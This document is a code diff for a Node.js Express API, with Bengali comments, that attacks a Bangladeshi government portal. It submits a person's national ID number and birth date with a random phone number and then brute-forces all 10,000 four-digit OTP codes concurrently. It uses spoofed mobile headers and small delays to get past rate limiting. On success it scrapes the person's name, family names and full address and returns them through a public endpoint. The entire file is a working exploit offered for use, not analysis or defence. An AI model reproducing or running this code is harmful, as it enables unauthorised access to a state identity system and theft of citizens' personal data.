@@ -1,6 +1,7 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
+const { EventEmitter } = require('events');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -9,46 +10,40 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(express.json());
 
-// Configuration - কনকারেন্সি কমিয়ে দিলাম
+// Configuration
 const MOBILE_PREFIX = "019";
-const MAX_CONCURRENT = 50;
+const MAX_CONCURRENT = 30; // ভার্চুয়াল মেশিনের জন্য অপটিমাম
+const TIMEOUT = 120000; // 2 মিনিট - 10,000 OTP চেক করার জন্য
+const BATCH_SIZE = 500; // প্রতি বারে চেক
 const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";
-const TIMEOUT = 300000;
 
-// Enhanced axios instance with timeout
-const axiosInstance = axios.create({
-    timeout: TIMEOUT,
-    maxRedirects: 0,
-    validateStatus: null
+// Simplified headers for speed
+const BASE_HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Accept': '*/*',
+    'Accept-Language': 'bn-BD,bn;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/x-www-form-urlencoded',
+};
+
+// Create a connection pool
+const httpsAgent = new require('https').Agent({ 
+    keepAlive: true,
+    maxSockets: MAX_CONCURRENT * 2,
+    maxFreeSockets: 10,
+    timeout: 60000
 });
 
-// রিয়েল ডিভাইসের হেডার ডাটা
-const BASE_HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'Accept-Language': 'bn-BD,bn;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Cache-Control': 'no-cache',
-    'Pragma': 'no-cache',
-    'Connection': 'keep-alive',
-    'Upgrade-Insecure-Requests': '1',
-    'Sec-Fetch-Dest': 'document',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-User': '?1',
-    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
-    'sec-ch-ua-model': '"SM-A526B"',
-    'sec-ch-ua-bitness': '"64"',
-    'sec-ch-ua-full-version': '"131.0.6778.0"',
-    'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.0", "Chromium";v="131.0.6778.0", "Not_A Brand";v="24.0.0.0"',
-    'sec-ch-ua-arch': '"arm"',
-    'sec-ch-ua-wow64': '?0',
-    'X-Requested-With': 'com.android.chrome',
-    'Priority': 'u=0, i',
-};
+// Axios instance with connection pool
+const axiosInstance = axios.create({
+    httpsAgent,
+    timeout: 8000,
+    maxRedirects: 0,
+    validateStatus: null,
+    maxContentLength: Infinity,
+    maxBodyLength: Infinity
+});
 
 // Helpers
 function randomMobile(prefix) {
@@ -57,321 +52,513 @@ function randomMobile(prefix) {
 
 function randomPassword() {
     const uppercase = String.fromCharCode(65 + Math.floor(Math.random() * 26));
-    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
     let randomChars = '';
     for (let i = 0; i < 8; i++) randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
     return "#" + uppercase + randomChars;
 }
 
-function generateOTPRange() {
-    return Array.from({ length: 10000 }, (_, i) => i.toString().padStart(4, '0'));
+// Generate all 10,000 OTPs in optimized batches
+function* generateOTPBatches(batchSize = 100) {
+    const total = 10000;
+    for (let i = 0; i < total; i += batchSize) {
+        const batch = [];
+        for (let j = 0; j < batchSize && (i + j) < total; j++) {
+            batch.push((i + j).toString().padStart(4, '0'));
+        }
+        yield batch;
+    }
 }
 
-// Session creation with timeout
+// Session creation
 async function getSessionAndBypass(nid, dob, mobile, password) {
     const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor';
-    const headers = { 
-        ...BASE_HEADERS, 
-        'Content-Type': 'application/x-www-form-urlencoded', 
-        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor' 
-    };
-    const data = { 
-        nidNumber: nid, 
-        email: "", 
-        mobileNo: mobile, 
-        dateOfBirth: dob, 
-        password, 
-        confirm_password: password, 
-        next1: "" 
-    };
-
-    const res = await axiosInstance.post(url, data, { headers });
     
-    if (res.status === 302 && res.headers.location && res.headers.location.includes('mov-verification')) {
-        const cookies = res.headers['set-cookie'] || [];
+    const headers = {
+        ...BASE_HEADERS,
+        'Origin': 'https://fsmms.dgf.gov.bd',
+        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor'
+    };
+    
+    const params = new URLSearchParams();
+    params.append('nidNumber', nid);
+    params.append('email', '');
+    params.append('mobileNo', mobile);
+    params.append('dateOfBirth', dob);
+    params.append('password', password);
+    params.append('confirm_password', password);
+    params.append('next1', '');
+
+    const response = await axiosInstance.post(url, params.toString(), { headers });
+    
+    if (response.status === 302 && response.headers.location && response.headers.location.includes('mov-verification')) {
+        const cookies = response.headers['set-cookie'] || [];
         return { 
-            session: axios.create({ 
-                timeout: TIMEOUT,
-                headers: { ...BASE_HEADERS, 'Cookie': cookies.join('; ') } 
-            }), 
-            cookies 
+            session: axiosInstance,
+            cookies: cookies.map(cookie => cookie.split(';')[0])
         };
     }
-    throw new Error('Bypass Failed - Check NID and DOB');
+    
+    throw new Error('Session creation failed');
 }
 
-// Optimized OTP checking with better concurrency control
-async function tryBatch(session, cookies, otpRange) {
-    let found = null;
-    let foundFlag = false;
+// Optimized OTP brute force with batch processing
+async function bruteForceOTP(session, cookies) {
+    console.log('🔍 Starting full OTP brute force (10,000 codes)...');
     
-    // Optimized shuffle
-    const queue = [...otpRange];
-    for (let i = queue.length - 1; i > 0; i--) {
-        const j = Math.floor(Math.random() * (i + 1));
-        [queue[i], queue[j]] = [queue[j], queue[i]];
-    }
-
-    // Worker function with improved error handling
+    const eventEmitter = new EventEmitter();
+    let foundOTP = null;
+    let processed = 0;
+    let activeWorkers = 0;
+    const startTime = Date.now();
+    
+    // Progress reporting
+    const progressInterval = setInterval(() => {
+        const elapsed = (Date.now() - startTime) / 1000;
+        const rate = processed / elapsed;
+        const remaining = (10000 - processed) / rate;
+        console.log(`📊 Progress: ${processed}/10000 (${(processed/100).toFixed(1)}%) - Rate: ${rate.toFixed(1)} OTP/s - ETA: ${remaining.toFixed(1)}s`);
+    }, 5000);
+    
+    // Worker function
     const worker = async (workerId) => {
-        while (queue.length > 0 && !foundFlag) {
-            const otp = queue.pop();
-            if (!otp || foundFlag) break;
+        while (!foundOTP && processed < 10000) {
+            const currentIndex = processed++;
+            if (currentIndex >= 10000) break;
+            
+            const otp = currentIndex.toString().padStart(4, '0');
             
             try {
                 const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
-                const headers = { 
-                    ...BASE_HEADERS, 
-                    'Content-Type': 'application/x-www-form-urlencoded', 
-                    'Cookie': cookies.join('; '), 
-                    'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification' 
-                };
-                const data = { 
-                    otpDigit1: otp[0], 
-                    otpDigit2: otp[1], 
-                    otpDigit3: otp[2], 
-                    otpDigit4: otp[3] 
+                const headers = {
+                    ...BASE_HEADERS,
+                    'Cookie': cookies.join('; '),
+                    'Origin': 'https://fsmms.dgf.gov.bd',
+                    'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
                 };
                 
-                const res = await session.post(url, data, { 
-                    timeout: 10000,
-                    maxRedirects: 0, 
-                    validateStatus: null, 
-                    headers 
+                const params = new URLSearchParams();
+                params.append('otpDigit1', otp[0]);
+                params.append('otpDigit2', otp[1]);
+                params.append('otpDigit3', otp[2]);
+                params.append('otpDigit4', otp[3]);
+                
+                const response = await session.post(url, params.toString(), { 
+                    headers,
+                    timeout: 3000
                 });
                 
-                if (res.status === 302 && res.headers.location && res.headers.location.includes(TARGET_LOCATION)) {
-                    found = otp;
-                    foundFlag = true; 
-                    console.log(`✅ Worker ${workerId} found OTP: ${otp}`);
+                if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
+                    foundOTP = otp;
+                    eventEmitter.emit('found', otp);
+                    console.log(`🎉 Worker ${workerId} found OTP: ${otp} at index ${currentIndex}`);
                     break;
                 }
-            } catch (err) {
-                // Silent fail for individual request
-                // Don't break the worker for timeout errors
+                
+                // Rate limiting protection
+                if (currentIndex % 100 === 0) {
+                    await new Promise(resolve => setTimeout(resolve, 50));
+                }
+                
+            } catch (error) {
+                // Silent retry - decrement counter to retry this OTP
+                processed--;
+                await new Promise(resolve => setTimeout(resolve, 100));
             }
         }
     };
-
-    try {
-        // Start controlled number of workers
-        const workers = [];
-        const actualConcurrent = Math.min(MAX_CONCURRENT, queue.length);
+    
+    return new Promise((resolve, reject) => {
+        eventEmitter.once('found', (otp) => {
+            clearInterval(progressInterval);
+            console.log(`✅ OTP found in ${(Date.now() - startTime)/1000}s: ${otp}`);
+            resolve(otp);
+        });
         
-        for (let i = 0; i < actualConcurrent; i++) {
+        // Start all workers
+        const workers = [];
+        for (let i = 0; i < MAX_CONCURRENT; i++) {
             workers.push(worker(i + 1));
         }
         
-        await Promise.all(workers);
+        // Set timeout
+        setTimeout(() => {
+            if (!foundOTP) {
+                clearInterval(progressInterval);
+                console.log(`⏰ Timeout after ${TIMEOUT/1000}s - Processed ${processed}/10000 OTPs`);
+                resolve(null);
+            }
+        }, TIMEOUT);
         
-        // Additional safety: if found but Promise.all still running
-        if (found) {
-            return found;
+        // Wait for all workers or OTP found
+        Promise.all(workers).then(() => {
+            if (!foundOTP) {
+                clearInterval(progressInterval);
+                console.log(`❌ No OTP found after processing all 10,000 codes`);
+                resolve(null);
+            }
+        }).catch(reject);
+    });
+}
+
+// Alternative: Sequential batch processing (more reliable)
+async function bruteForceOTPBatch(session, cookies) {
+    console.log('🔍 Starting batch OTP brute force...');
+    
+    let foundOTP = null;
+    let processed = 0;
+    const startTime = Date.now();
+    
+    // Process in batches
+    for (let batchStart = 0; batchStart < 10000 && !foundOTP; batchStart += BATCH_SIZE) {
+        const batchEnd = Math.min(batchStart + BATCH_SIZE, 10000);
+        console.log(`🔄 Processing batch ${batchStart}-${batchEnd-1}...`);
+        
+        const batchPromises = [];
+        
+        for (let i = batchStart; i < batchEnd; i++) {
+            const otp = i.toString().padStart(4, '0');
+            
+            batchPromises.push((async () => {
+                try {
+                    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
+                    const headers = {
+                        ...BASE_HEADERS,
+                        'Cookie': cookies.join('; '),
+                        'Origin': 'https://fsmms.dgf.gov.bd',
+                        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
+                    };
+                    
+                    const params = new URLSearchParams();
+                    params.append('otpDigit1', otp[0]);
+                    params.append('otpDigit2', otp[1]);
+                    params.append('otpDigit3', otp[2]);
+                    params.append('otpDigit4', otp[3]);
+                    
+                    const response = await session.post(url, params.toString(), { 
+                        headers,
+                        timeout: 5000
+                    });
+                    
+                    if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
+                        return otp;
+                    }
+                } catch (error) {
+                    // Ignore individual errors
+                }
+                return null;
+            })());
         }
         
-        return null;
-    } catch (err) {
-        console.error('Worker pool error:', err.message);
-        return null;
+        // Wait for current batch
+        const results = await Promise.all(batchPromises);
+        processed += BATCH_SIZE;
+        
+        // Check if any OTP was found
+        for (const result of results) {
+            if (result) {
+                foundOTP = result;
+                break;
+            }
+        }
+        
+        // Report progress
+        const elapsed = (Date.now() - startTime) / 1000;
+        console.log(`📊 Progress: ${processed}/10000 (${(processed/100).toFixed(1)}%) - Time: ${elapsed.toFixed(1)}s`);
+        
+        // Small delay between batches
+        if (!foundOTP && batchEnd < 10000) {
+            await new Promise(resolve => setTimeout(resolve, 500));
+        }
     }
+    
+    const totalTime = (Date.now() - startTime) / 1000;
+    console.log(foundOTP ? `✅ OTP found: ${foundOTP} in ${totalTime}s` : `❌ No OTP found in ${totalTime}s`);
+    
+    return foundOTP;
 }
 
-// Fetch form data with timeout
+// Ultra-fast brute force with connection reuse
+async function ultraFastBruteForce(session, cookies) {
+    console.log('⚡ Starting ultra-fast OTP brute force...');
+    
+    const controller = new AbortController();
+    const signal = controller.signal;
+    let foundOTP = null;
+    let completed = 0;
+    const startTime = Date.now();
+    
+    // Create reusable request configuration
+    const baseConfig = {
+        headers: {
+            ...BASE_HEADERS,
+            'Cookie': cookies.join('; '),
+            'Origin': 'https://fsmms.dgf.gov.bd',
+            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
+        },
+        timeout: 4000,
+        signal
+    };
+    
+    // Process all OTPs
+    const processOTP = async (otp) => {
+        try {
+            const params = new URLSearchParams();
+            params.append('otpDigit1', otp[0]);
+            params.append('otpDigit2', otp[1]);
+            params.append('otpDigit3', otp[2]);
+            params.append('otpDigit4', otp[3]);
+            
+            const response = await session.post(
+                'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step',
+                params.toString(),
+                baseConfig
+            );
+            
+            completed++;
+            
+            if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
+                return otp;
+            }
+        } catch (error) {
+            if (error.name !== 'AbortError') {
+                completed++;
+            }
+        }
+        return null;
+    };
+    
+    // Create all promises
+    const promises = [];
+    for (let i = 0; i < 10000; i++) {
+        const otp = i.toString().padStart(4, '0');
+        promises.push(processOTP(otp));
+        
+        // Control concurrency
+        if (promises.length >= MAX_CONCURRENT * 10) {
+            // Check results periodically
+            const results = await Promise.all(promises);
+            for (const result of results) {
+                if (result) {
+                    controller.abort();
+                    return result;
+                }
+            }
+            promises.length = 0;
+            
+            // Progress report
+            if (completed % 1000 === 0) {
+                const elapsed = (Date.now() - startTime) / 1000;
+                console.log(`📊 Processed: ${completed}/10000 - Rate: ${(completed/elapsed).toFixed(1)} OTP/s`);
+            }
+        }
+    }
+    
+    // Check remaining promises
+    if (promises.length > 0) {
+        const results = await Promise.all(promises);
+        for (const result of results) {
+            if (result) {
+                return result;
+            }
+        }
+    }
+    
+    return null;
+}
+
+// Fetch form data
 async function fetchFormData(session, cookies) {
     const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form';
-    const headers = { 
-        ...BASE_HEADERS, 
-        'Cookie': cookies.join('; '), 
-        'Sec-Fetch-Site': 'cross-site', 
-        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification' 
-    };
-    const res = await session.get(url, { headers, timeout: TIMEOUT });
-    return res.data;
-}
-
-// Extract fields
-function extractFields(html, ids) {
-    const result = {};
-    ids.forEach(id => {
-        const match = html.match(new RegExp(`<input[^>]*id="${id}"[^>]*value="([^"]*)"`, 'i'));
-        result[id] = match ? match[1] : "";
-    });
-    return result;
-}
-
-// Enrich data
-function enrichData(contractor_name, result, nid, dob) {
-    const mapped = {
-        nameBangla: contractor_name,
-        nationalId: nid,
-        dateOfBirth: dob,
-        fatherName: result.fatherName || "",
-        motherName: result.motherName || "",
-        spouseName: result.spouseName || "",
-        birthPlace: result.nidPerDistrict || "",
-        nationality: result.nationality || "",
-        division: result.nidPerDivision || "",
-        district: result.nidPerDistrict || "",
-        upazila: result.nidPerUpazila || "",
-        union: result.nidPerUnion || "",
-        village: result.nidPerVillage || "",
-        ward: result.nidPerWard || "",
-        zip_code: result.nidPerZipCode || "",
-        post_office: result.nidPerPostOffice || ""
+    const headers = {
+        ...BASE_HEADERS,
+        'Cookie': cookies.join('; '),
+        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
     };
     
-    const addr_parts = [
-        `বাসা/হোল্ডিং: ${result.nidPerHolding || '-'}`,
-        `গ্রাম/রাস্তা: ${result.nidPerVillage || ''}`,
-        `মৌজা/মহল্লা: ${result.nidPerMouza || ''}`,
-        `ইউনিয়ন ওয়ার্ড: ${result.nidPerUnion || ''}`,
-        `ডাকঘর: ${result.nidPerPostOffice || ''} - ${result.nidPerZipCode || ''}`,
-        `উপজেলা: ${result.nidPerUpazila || ''}`,
-        `জেলা: ${result.nidPerDistrict || ''}`,
-        `বিভাগ: ${result.nidPerDivision || ''}`
+    const response = await session.get(url, { headers, timeout: 10000 });
+    return response.data;
+}
+
+// Extract data from HTML
+function extractNIDData(html, nid, dob) {
+    // Extract name
+    let name = '';
+    const nameMatch = html.match(/<input[^>]*id="contractorName"[^>]*value="([^"]*)"/i) ||
+                     html.match(/<input[^>]*name="contractorName"[^>]*value="([^"]*)"/i);
+    if (nameMatch) name = nameMatch[1];
+    
+    // Extract other fields
+    const fields = [
+        'fatherName', 'motherName', 'spouseName',
+        'nidPerDivision', 'nidPerDistrict', 'nidPerUpazila', 'nidPerUnion',
+        'nidPerVillage', 'nidPerWard', 'nidPerZipCode', 'nidPerPostOffice',
+        'nidPerHolding', 'nidPerMouza', 'nationality'
     ];
     
-    const filtered = addr_parts.filter(p => {
-        const value = p.split(": ")[1];
-        return value && value.trim() && value !== "-";
+    const data = { nameBangla: name, nationalId: nid, dateOfBirth: dob };
+    
+    fields.forEach(field => {
+        const regex = new RegExp(`name="${field}"[^>]*value="([^"]*)"`, 'i');
+        const match = html.match(regex);
+        data[field] = match ? match[1] : '';
     });
     
-    mapped.permanentAddress = filtered.join(", ");
-    mapped.presentAddress = filtered.join(", ");
-    return mapped;
+    // Construct addresses
+    const addrParts = [];
+    if (data.nidPerHolding) addrParts.push(`বাসা/হোল্ডিং: ${data.nidPerHolding}`);
+    if (data.nidPerVillage) addrParts.push(`গ্রাম: ${data.nidPerVillage}`);
+    if (data.nidPerMouza) addrParts.push(`মৌজা: ${data.nidPerMouza}`);
+    if (data.nidPerUnion) addrParts.push(`ইউনিয়ন: ${data.nidPerUnion}`);
+    if (data.nidPerWard) addrParts.push(`ওয়ার্ড: ${data.nidPerWard}`);
+    if (data.nidPerPostOffice) addrParts.push(`ডাকঘর: ${data.nidPerPostOffice}`);
+    if (data.nidPerZipCode) addrParts.push(`পোস্টকোড: ${data.nidPerZipCode}`);
+    if (data.nidPerUpazila) addrParts.push(`উপজেলা: ${data.nidPerUpazila}`);
+    if (data.nidPerDistrict) addrParts.push(`জেলা: ${data.nidPerDistrict}`);
+    if (data.nidPerDivision) addrParts.push(`বিভাগ: ${data.nidPerDivision}`);
+    
+    const address = addrParts.join(', ');
+    
+    return {
+        nameBangla: data.nameBangla,
+        nationalId: nid,
+        dateOfBirth: dob,
+        fatherName: data.fatherName || '',
+        motherName: data.motherName || '',
+        spouseName: data.spouseName || '',
+        birthPlace: data.nidPerDistrict || '',
+        nationality: data.nationality || 'বাংলাদেশী',
+        division: data.nidPerDivision || '',
+        district: data.nidPerDistrict || '',
+        upazila: data.nidPerUpazila || '',
+        union: data.nidPerUnion || '',
+        village: data.nidPerVillage || '',
+        ward: data.nidPerWard || '',
+        zip_code: data.nidPerZipCode || '',
+        post_office: data.nidPerPostOffice || '',
+        permanentAddress: address,
+        presentAddress: address
+    };
 }
 
-// API Routes with improved error handling
+// API Routes
 app.get('/', (req, res) => {
     res.json({
-        message: 'Enhanced NID Info API is running',
+        message: 'Full OTP Brute Force API',
         status: 'active',
-        endpoints: { 
-            getInfo: '/get-info?nid=YOUR_NID&dob=YYYY-MM-DD',
-            health: '/health',
-            testCreds: '/test-creds'
-        },
-        features: { 
-            enhancedHeaders: true, 
-            concurrentOTP: true, 
-            improvedPasswordGeneration: true, 
-            mobilePrefix: MOBILE_PREFIX,
-            timeout: `${TIMEOUT}ms`,
-            maxConcurrent: MAX_CONCURRENT
-        },
-        notes: 'Fixed timeout issues, optimized concurrency'
+        endpoint: '/get-info?nid=NID&dob=YYYY-MM-DD',
+        note: 'Processes all 10,000 OTPs - May take 60-120 seconds'
     });
 });
 
 app.get('/get-info', async (req, res) => {
-    // Set response timeout
-    req.setTimeout(TIMEOUT + 10000);
+    const requestStart = Date.now();
     
     try {
-        const { nid, dob } = req.query;
+        const { nid, dob, method = 'batch' } = req.query;
+        
         if (!nid || !dob) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'NID and DOB are required' 
-            });
-        }
-
-        // Validate date format
-        if (!/^\d{4}-\d{2}-\d{2}$/.test(dob)) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Date must be in YYYY-MM-DD format' 
+            return res.status(400).json({
+                success: false,
+                error: 'NID and DOB (YYYY-MM-DD) are required'
             });
         }
         
+        console.log(`\n🚀 Starting full OTP brute force for NID: ${nid}`);
+        
+        // Generate credentials
         const password = randomPassword();
         const mobile = randomMobile(MOBILE_PREFIX);
-            
-       
+        console.log(`📱 Credentials: Mobile=${mobile}, Password=${password}`);
+        
+        // Step 1: Create session
+        console.log('🔐 Creating session...');
         const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);
-        const otpRange = generateOTPRange();
-        const foundOTP = await tryBatch(session, cookies, otpRange);
+        console.log('✅ Session created');
+        
+        // Step 2: Brute force OTP
+        console.log('🔑 Starting OTP brute force (10,000 codes)...');
+        
+        let foundOTP;
+        switch (method) {
+            case 'fast':
+                foundOTP = await ultraFastBruteForce(session, cookies);
+                break;
+            case 'batch':
+            default:
+                foundOTP = await bruteForceOTPBatch(session, cookies);
+                break;
+        }
         
         if (!foundOTP) {
-            console.log('OTP not found');
-            return res.status(404).json({ 
-                success: false, 
-                error: "OTP not found within the range" 
+            const elapsed = Date.now() - requestStart;
+            return res.status(404).json({
+                success: false,
+                error: 'No valid OTP found after checking all 10,000 codes',
+                elapsedTime: `${elapsed}ms`,
+                suggestion: 'Try again or verify NID/DOB'
             });
         }
         
+        // Step 3: Fetch data
+        console.log('📄 Fetching NID data...');
         const html = await fetchFormData(session, cookies);
         
+        // Step 4: Extract and format data
+        console.log('🔧 Processing data...');
+        const nidData = extractNIDData(html, nid, dob);
         
-        const ids = [
-            "contractorName","fatherName","motherName","spouseName",
-            "nidPerDivision","nidPerDistrict","nidPerUpazila","nidPerUnion",
-            "nidPerVillage","nidPerWard","nidPerZipCode","nidPerPostOffice",
-            "nidPerHolding","nidPerMouza"
-        ];
+        const totalTime = Date.now() - requestStart;
         
-        const extracted = extractFields(html, ids);
-        const finalData = enrichData(extracted.contractorName || "", extracted, nid, dob);
+        console.log(`✅ Success! Total time: ${totalTime}ms`);
         
-        
-        res.json({ 
-            success: true, 
-            data: finalData
+        res.json({
+            success: true,
+            data: nidData,
+            metadata: {
+                processingTime: `${totalTime}ms`,
+                otpFound: foundOTP,
+                mobileUsed: mobile,
+                method: method,
+                timestamp: new Date().toISOString()
+            }
         });
-
-    } catch (err) {
-        console.error('Error in /get-info:', err.message);
         
-        if (err.code === 'ECONNABORTED') {
-            return res.status(504).json({ 
-                success: false, 
-                error: 'Request timeout - Server is taking too long to respond' 
+    } catch (error) {
+        console.error('❌ Error:', error.message);
+        const elapsed = Date.now() - requestStart;
+        
+        if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
+            return res.status(504).json({
+                success: false,
+                error: 'Request timeout - OTP brute force taking too long',
+                elapsedTime: `${elapsed}ms`,
+                suggestion: 'Try method=batch for more reliable results'
             });
         }
         
-        res.status(500).json({ 
-            success: false, 
-            error: err.message || 'Internal server error',
-            suggestion: 'Please check the NID and DOB format and try again'
+        res.status(500).json({
+            success: false,
+            error: error.message,
+            elapsedTime: `${elapsed}ms`
         });
     }
 });
 
-// Add start time middleware
-app.use((req, res, next) => {
-    req.startTime = Date.now();
-    next();
-});
-
-app.get('/health', (req, res) => {
-    res.json({ 
-        status: 'OK', 
-        timestamp: new Date().toISOString(), 
-        service: 'Enhanced NID Info API', 
-        version: '2.0.5',
-        uptime: process.uptime()
-    });
-});
-
-app.get('/test-creds', (req, res) => {
-    res.json({ 
-        mobile: randomMobile(MOBILE_PREFIX), 
-        password: randomPassword(), 
-        note: 'Random test credentials for testing only' 
-    });
-});
-
-// Global error handler
-app.use((err, req, res, next) => {
-    console.error('Global error:', err);
-    res.status(500).json({
-        success: false,
-        error: 'Internal server error',
-        message: err.message
+app.get('/status', (req, res) => {
+    res.json({
+        status: 'running',
+        uptime: process.uptime(),
+        memory: process.memoryUsage(),
+        timestamp: new Date().toISOString()
     });
 });
 
 app.listen(PORT, () => {
-    console.log(`API running on port ${PORT}`);
-    console.log(`Configuration: MAX_CONCURRENT=${MAX_CONCURRENT}, TIMEOUT=${TIMEOUT}ms`);
+    console.log(`🚀 Full OTP Brute Force API running on port ${PORT}`);
+    console.log(`⚡ Max concurrent: ${MAX_CONCURRENT}`);
+    console.log(`⏱️  Timeout: ${TIMEOUT}ms`);
+    console.log(`🔗 Endpoint: http://localhost:${PORT}/get-info?nid=NID&dob=YYYY-MM-DD`);
+    console.log(`📊 Batch method: http://localhost:${PORT}/get-info?nid=NID&dob=YYYY-MM-DD&method=batch`);
+    console.log(`⚡ Fast method: http://localhost:${PORT}/get-info?nid=NID&dob=YYYY-MM-DD&method=fast`);
 });
